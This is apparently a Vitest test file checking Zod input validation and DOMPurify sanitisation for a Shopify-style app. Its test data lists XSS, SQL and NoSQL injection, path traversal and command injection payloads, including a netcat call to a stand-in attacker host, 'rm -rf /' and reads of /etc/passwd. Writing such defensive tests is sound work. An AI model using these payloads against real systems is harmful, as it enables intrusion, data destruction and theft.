import { describe, it, expect } from 'vitest';
import { z } from 'zod';
import createDOMPurify from 'isomorphic-dompurify';

// Import validation schemas
import {
  customerSchema,
  tierSchema,
  creditAdjustmentSchema,
  searchQuerySchema
} from '~/utils/validation-schemas';

describe('Input Validation and XSS Prevention Tests', () => {
  const DOMPurify = createDOMPurify();

  describe('Zod Schema Validation', () => {
    describe('Customer Schema', () => {
      const schema = z.object({
        email: z.string().email().toLowerCase().trim(),
        firstName: z.string().min(1).max(50),
        lastName: z.string().min(1).max(50),
        storeCreditAmount: z.number().min(0).max(999999.99),
        tierId: z.string().uuid().optional()
      });

      it('should accept valid customer data', () => {
        const validData = {
          email: 'customer@example.com',
          firstName: 'John',
          lastName: 'Doe',
          storeCreditAmount: 100.50,
          tierId: '123e4567-e89b-12d3-a456-426614174000'
        };

        const result = schema.safeParse(validData);
        expect(result.success).toBe(true);
      });

      it('should reject invalid email formats', () => {
        const invalidEmails = [
          'not-an-email',
          '@example.com',
          'user@',
          'user@.com',
          'user@domain',
          '',
          'user@domain@domain.com'
        ];

        for (const email of invalidEmails) {
          const result = schema.safeParse({
            email,
            firstName: 'John',
            lastName: 'Doe',
            storeCreditAmount: 100
          });
          expect(result.success).toBe(false);
        }
      });

      it('should enforce field length limits', () => {
        const tooLongName = 'a'.repeat(51);
        const result = schema.safeParse({
          email: 'test@example.com',
          firstName: tooLongName,
          lastName: 'Doe',
          storeCreditAmount: 100
        });

        expect(result.success).toBe(false);
        expect(result.error?.issues[0].code).toBe('too_big');
      });

      it('should enforce numeric boundaries', () => {
        const invalidAmounts = [-1, -100, 1000000, Number.MAX_VALUE];

        for (const amount of invalidAmounts) {
          const result = schema.safeParse({
            email: 'test@example.com',
            firstName: 'John',
            lastName: 'Doe',
            storeCreditAmount: amount
          });
          expect(result.success).toBe(false);
        }
      });

      it('should reject non-UUID tier IDs', () => {
        const invalidUuids = [
          '123',
          'not-a-uuid',
          '123e4567-e89b-12d3-a456', // Too short
          '123e4567-e89b-12d3-a456-426614174000-extra', // Too long
          'g23e4567-e89b-12d3-a456-426614174000' // Invalid character
        ];

        for (const tierId of invalidUuids) {
          const result = schema.safeParse({
            email: 'test@example.com',
            firstName: 'John',
            lastName: 'Doe',
            storeCreditAmount: 100,
            tierId
          });
          expect(result.success).toBe(false);
        }
      });
    });

    describe('Search Query Schema', () => {
      const schema = z.object({
        query: z.string().max(100).transform(val =>
          DOMPurify.sanitize(val, { ALLOWED_TAGS: [] })
        ),
        limit: z.number().int().min(1).max(100).default(20),
        offset: z.number().int().min(0).default(0)
      });

      it('should sanitize search queries', () => {
        const maliciousQueries = [
          '<script>alert("xss")</script>',
          '"><script>alert(1)</script>',
          '<img src=x onerror=alert(1)>',
          'javascript:alert(1)',
          '<svg onload=alert(1)>'
        ];

        for (const query of maliciousQueries) {
          const result = schema.parse({ query });
          expect(result.query).not.toContain('<script>');
          expect(result.query).not.toContain('alert');
          expect(result.query).not.toContain('onerror');
          expect(result.query).not.toContain('onload');
        }
      });

      it('should enforce query length limits', () => {
        const longQuery = 'a'.repeat(101);
        const result = schema.safeParse({ query: longQuery });
        expect(result.success).toBe(false);
      });

      it('should validate pagination parameters', () => {
        const invalidPagination = [
          { limit: 0 },
          { limit: 101 },
          { limit: -1 },
          { offset: -1 },
          { limit: 'not-a-number' },
          { offset: 'not-a-number' }
        ];

        for (const params of invalidPagination) {
          const result = schema.safeParse({
            query: 'test',
            ...params
          });
          expect(result.success).toBe(false);
        }
      });
    });

    describe('SQL Injection Prevention', () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE customers; --",
        "1' OR '1'='1",
        "\" OR \"\"=\"",
        "` OR 1=1 /*",
        "Robert'); DROP TABLE customers;--",
        "admin'--",
        "' OR 1=1--",
        "1' AND '1'='1",
        "' UNION SELECT * FROM users--",
        "1' ORDER BY 1--"
      ];

      it('should treat SQL injection attempts as literal strings', () => {
        const schema = z.object({
          search: z.string().max(100)
        });

        for (const payload of sqlInjectionPayloads) {
          const result = schema.safeParse({ search: payload });

          if (payload.length <= 100) {
            expect(result.success).toBe(true);
            // The payload is accepted as a string, but would be parameterized in queries
            expect(result.data?.search).toBe(payload);
          } else {
            expect(result.success).toBe(false);
          }
        }
      });

      it('should reject overly long SQL injection attempts', () => {
        const longInjection = "' OR '1'='1" + ' UNION '.repeat(100);
        const schema = z.object({
          search: z.string().max(100)
        });

        const result = schema.safeParse({ search: longInjection });
        expect(result.success).toBe(false);
      });
    });

    describe('NoSQL Injection Prevention', () => {
      it('should reject object injection attempts', () => {
        const schema = z.object({
          filter: z.string() // Expecting string, not object
        });

        const noSqlPayloads = [
          { $gt: '' },
          { $ne: null },
          { $where: 'this.password == "test"' },
          { $regex: '.*' }
        ];

        for (const payload of noSqlPayloads) {
          const result = schema.safeParse({ filter: payload });
          expect(result.success).toBe(false); // Objects rejected when string expected
        }
      });

      it('should sanitize MongoDB operators in strings', () => {
        const schema = z.object({
          name: z.string().transform(val =>
            val.replace(/[$]/g, '') // Remove $ characters
          )
        });

        const result = schema.parse({ name: '$admin' });
        expect(result.name).toBe('admin'); // $ removed
      });
    });

    describe('Command Injection Prevention', () => {
      it('should reject shell command characters', () => {
        const schema = z.object({
          filename: z.string().regex(/^[a-zA-Z0-9_.-]+$/, 'Invalid filename')
        });

        const commandPayloads = [
          'file.txt; rm -rf /',
          'file.txt && cat /etc/passwd',
          'file.txt | nc attacker.com 1234',
          '$(whoami)',
          '`ls -la`',
          'file.txt\nls',
          'file.txt\x00cat /etc/passwd'
        ];

        for (const payload of commandPayloads) {
          const result = schema.safeParse({ filename: payload });
          expect(result.success).toBe(false);
        }
      });

      it('should accept safe filenames', () => {
        const schema = z.object({
          filename: z.string().regex(/^[a-zA-Z0-9_.-]+$/)
        });

        const safeFilenames = [
          'document.pdf',
          'report-2024.xlsx',
          'backup_file.tar.gz',
          '123_test.txt'
        ];

        for (const filename of safeFilenames) {
          const result = schema.safeParse({ filename });
          expect(result.success).toBe(true);
        }
      });
    });

    describe('Path Traversal Prevention', () => {
      it('should reject path traversal attempts', () => {
        const schema = z.object({
          path: z.string().refine(
            val => !val.includes('..') && !val.includes('~'),
            'Invalid path'
          )
        });

        const traversalPayloads = [
          '../../etc/passwd',
          '../../../windows/system32',
          'uploads/../../../etc/shadow',
          '....//....//etc/passwd',
          '..;/etc/passwd',
          '~/../../etc/passwd',
          '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ];

        for (const payload of traversalPayloads) {
          const result = schema.safeParse({ path: payload });
          expect(result.success).toBe(false);
        }
      });

      it('should accept safe paths', () => {
        const schema = z.object({
          path: z.string().refine(
            val => !val.includes('..') && !val.includes('~'),
            'Invalid path'
          )
        });

        const safePaths = [
          'uploads/2024/document.pdf',
          'public/images/logo.png',
          'data/customers/export.csv'
        ];

        for (const path of safePaths) {
          const result = schema.safeParse({ path });
          expect(result.success).toBe(true);
        }
      });
    });
  });

  describe('XSS Prevention with DOMPurify', () => {
    it('should remove script tags', () => {
      const dirty = '<p>Hello <script>alert("XSS")</script>World</p>';
      const clean = DOMPurify.sanitize(dirty);
      expect(clean).toBe('<p>Hello World</p>');
      expect(clean).not.toContain('<script>');
    });

    it('should remove event handlers', () => {
      const payloads = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<div onclick=alert(1)>Click</div>',
        '<input onfocus=alert(1)>',
        '<a href="#" onmouseover=alert(1)>Link</a>'
      ];

      for (const payload of payloads) {
        const clean = DOMPurify.sanitize(payload);
        expect(clean).not.toContain('alert');
        expect(clean).not.toMatch(/on\w+=/);
      }
    });

    it('should remove javascript: URLs', () => {
      const payloads = [
        '<a href="javascript:alert(1)">Link</a>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<img src="javascript:alert(1)">',
        '<form action="javascript:alert(1)">'
      ];

      for (const payload of payloads) {
        const clean = DOMPurify.sanitize(payload);
        expect(clean).not.toContain('javascript:');
      }
    });

    it('should handle data: URLs safely', () => {
      const payload = '<img src="data:text/html,<script>alert(1)</script>">';
      const clean = DOMPurify.sanitize(payload, {
        ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i
      });
      expect(clean).not.toContain('data:');
    });

    it('should preserve safe HTML', () => {
      const safe = '<p>Hello <strong>World</strong>! <em>This</em> is <u>safe</u>.</p>';
      const clean = DOMPurify.sanitize(safe);
      expect(clean).toBe(safe);
    });

    it('should handle malformed HTML', () => {
      const malformed = [
        '<<script>alert(1)//',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<img src=x:alert(1) onerror=eval(src)>',
        '"><script>alert(1)</script>',
        '</title><script>alert(1)</script>'
      ];

      for (const payload of malformed) {
        const clean = DOMPurify.sanitize(payload);
        expect(clean).not.toContain('alert');
        expect(clean).not.toContain('<script');
      }
    });

    it('should prevent style-based XSS', () => {
      const payloads = [
        '<style>@import "javascript:alert(1)"</style>',
        '<div style="background:url(javascript:alert(1))">',
        '<div style="expression(alert(1))">',
        '<link rel="stylesheet" href="javascript:alert(1)">'
      ];

      for (const payload of payloads) {
        const clean = DOMPurify.sanitize(payload);
        expect(clean).not.toContain('javascript:');
        expect(clean).not.toContain('expression');
      }
    });

    it('should sanitize SVG content', () => {
      const svg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <script>alert(1)</script>
          <g onload="alert(1)">
            <rect width="100" height="100" />
          </g>
        </svg>
      `;

      const clean = DOMPurify.sanitize(svg);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('onload');
      expect(clean).toContain('<rect'); // Safe content preserved
    });
  });

  describe('Content Security Policy Headers', () => {
    it('should validate CSP header format', () => {
      const csp = [
        "default-src 'self'",
        "script-src 'self' 'nonce-random123' https://cdn.shopify.com",
        "style-src 'self' 'unsafe-inline' https://cdn.shopify.com",
        "img-src 'self' data: https:",
        "connect-src 'self' https://api.shopify.com",
        "frame-ancestors https://*.myshopify.com https://admin.shopify.com"
      ].join('; ');

      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain('frame-ancestors');
      expect(csp).toContain('nonce-');
    });

    it('should include required Shopify frame ancestors', () => {
      const frameAncestors = 'frame-ancestors https://*.myshopify.com https://admin.shopify.com';
      expect(frameAncestors).toContain('.myshopify.com');
      expect(frameAncestors).toContain('admin.shopify.com');
    });
  });

  describe('Custom Validation Refinements', () => {
    it('should validate password complexity', () => {
      const passwordSchema = z.string()
        .min(8)
        .regex(/[A-Z]/, 'Must contain uppercase')
        .regex(/[a-z]/, 'Must contain lowercase')
        .regex(/[0-9]/, 'Must contain number')
        .regex(/[^A-Za-z0-9]/, 'Must contain special character');

      const weakPasswords = [
        'short',
        'alllowercase',
        'ALLUPPERCASE',
        'NoNumbers!',
        'NoSpecial123'
      ];

      for (const password of weakPasswords) {
        const result = passwordSchema.safeParse(password);
        expect(result.success).toBe(false);
      }

      const strongPassword = 'Str0ng!Pass#2024';
      const result = passwordSchema.safeParse(strongPassword);
      expect(result.success).toBe(true);
    });

    it('should validate phone numbers', () => {
      const phoneSchema = z.string().regex(
        /^\+?[1-9]\d{1,14}$/,
        'Invalid phone number'
      );

      const validPhones = [
        '+14155552222',
        '14155552222',
        '+442071234567'
      ];

      for (const phone of validPhones) {
        const result = phoneSchema.safeParse(phone);
        expect(result.success).toBe(true);
      }

      const invalidPhones = [
        '123',
        'not-a-phone',
        '+0123456789',
        '++14155552222'
      ];

      for (const phone of invalidPhones) {
        const result = phoneSchema.safeParse(phone);
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Error Message Safety', () => {
    it('should not leak sensitive information in errors', () => {
      const schema = z.object({
        apiKey: z.string().regex(/^sk_[a-zA-Z0-9]{32}$/)
      });

      const result = schema.safeParse({
        apiKey: 'wrong-format'
      });

      expect(result.success).toBe(false);
      if (!result.success) {
        const errorMessage = result.error.issues[0].message;
        expect(errorMessage).not.toContain('sk_'); // Don't leak key format
        expect(errorMessage).toBe('Invalid'); // Generic message
      }
    });

    it('should provide user-friendly error messages', () => {
      const schema = z.object({
        email: z.string().email('Please enter a valid email address'),
        age: z.number().min(18, 'You must be 18 or older')
      });

      const result = schema.safeParse({
        email: 'not-an-email',
        age: 16
      });

      expect(result.success).toBe(false);
      if (!result.success) {
        const messages = result.error.issues.map(i => i.message);
        expect(messages).toContain('Please enter a valid email address');
        expect(messages).toContain('You must be 18 or older');
      }
    });
  });
});